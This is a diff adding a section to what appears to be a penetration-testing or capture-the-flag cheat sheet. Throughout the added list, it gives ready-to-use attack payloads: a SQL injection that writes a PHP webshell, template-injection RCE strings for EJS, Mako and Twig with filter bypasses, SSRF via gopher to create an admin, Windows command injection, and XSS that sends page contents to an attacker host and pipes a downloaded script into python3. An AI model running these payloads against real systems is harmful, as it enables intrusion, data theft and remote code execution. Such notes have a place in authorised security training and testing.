@@ -39,6 +39,31 @@ chmod 600 id_rsa
 ssh -i id_rsa <user>@<target>        # if passphrase-protected: ssh2john id_rsa > h; john h
 ```
 
+## The exact gadget each chain needs (copy-paste lives in the linked file)
+These are the specific tricks these boxes turned on — the part that isn't "just run the scanner":
+- **Spring config via traversal** — fuzz PATH×FILE (clusterbomb) for `application.properties`,
+  grep it for the API key, log in. → `lfi.txt` (Spring Boot section).
+- **SQLi but sqlmap only dumps DB names** — put a literal `*` where the value goes in the saved
+  request (`patientName=*`) and re-run; then `--os-shell`. → `sqli.txt` (sqlmap section).
+- **PG SQLi → webshell** — `copy (select '<?php passthru($_GET[0]);?>') to '/var/tmp/cmd.php'`,
+  then browse to it in a web-served dir (/backups). → `sqli.txt`.
+- **EJS RCE** `<%= process.mainModule.require("child_process").execSync("id") %>`; if `process`/
+  `require`/`exec` are stripped once, **interleave** (`proprocesscess`). → `ssti.txt`.
+- **Mako RCE** `${self.module.cache.util.os.popen("id").read()}` (`.system()` shows only exit code). → `ssti.txt`.
+- **Twig RCE** `{{[0]|reduce('system','id')}}` or `{{['id']|filter('system')}}`. → `ssti.txt`.
+- **SSRF → create-admin** via `gopher://127.0.0.1:80/_POST /api/admin/create ...` (URL-encode, often
+  double-encode); localhost blocked → try `0.0.0.0` / `[::]` / decimal IP. → `ssrf.txt`.
+- **SSRF to bypass a 403** — can't fetch `/screenshots/x.png` directly, so make the server fetch it
+  via its own URL/analyze feature (`http://0.0.0.0/screenshots/..`). → `ssrf.txt`.
+- **XSS, source exfil** — `location.href='http://you/?exfil='+btoa(document.body.innerHTML)` to read
+  an admin DOM you can't see; decode to find a hidden endpoint. → `xss-exploitation.md`.
+- **XSS → internal RCE endpoint** — the bot's browser can reach a localhost `/run_command` the app
+  exposes; `fetch(..,{body:'cmd=curl http://you/rce.py|python3'})`. → `xss-exploitation.md`.
+- **Role/type privilege value** — fuzz the numeric `type`/`role` param to find the admin value
+  (e.g. `type=51`→`100`); if the server ignores it for you, send it via a CSRF form the admin bot
+  submits. → `idor.txt`, `scripts/csrf-gen.sh`.
+- **Windows cmd injection** — break out of a quoted path: `C:\backup"& whoami`, `"& type C:\proof.txt`. → `cmdi.txt`.
+
 ## Spring Boot targets (traversal / file read)
 ```
 WEB-INF/classes/application.properties   WEB-INF/classes/application.yml
